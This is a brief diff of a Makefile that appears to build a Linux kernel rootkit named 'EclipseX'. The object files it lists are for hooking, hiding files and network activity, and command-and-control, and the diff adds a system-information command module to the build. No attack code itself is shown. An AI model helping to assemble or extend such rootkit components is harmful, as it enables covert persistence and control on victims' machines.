@@ -4,11 +4,10 @@ EclipseX-objs := EclipseX_main.o \
 	hooks.o \
 	hide/filters.o \
 	hide/files.o \
-	hide/network.o 
-
+	hide/network.o \
+	c2/commands/system_info/system_info.o
 
 # 	c2/connection.o \
-	c2/commands/system_info/system_info.o
 
 PWD := $(CURDIR)
 
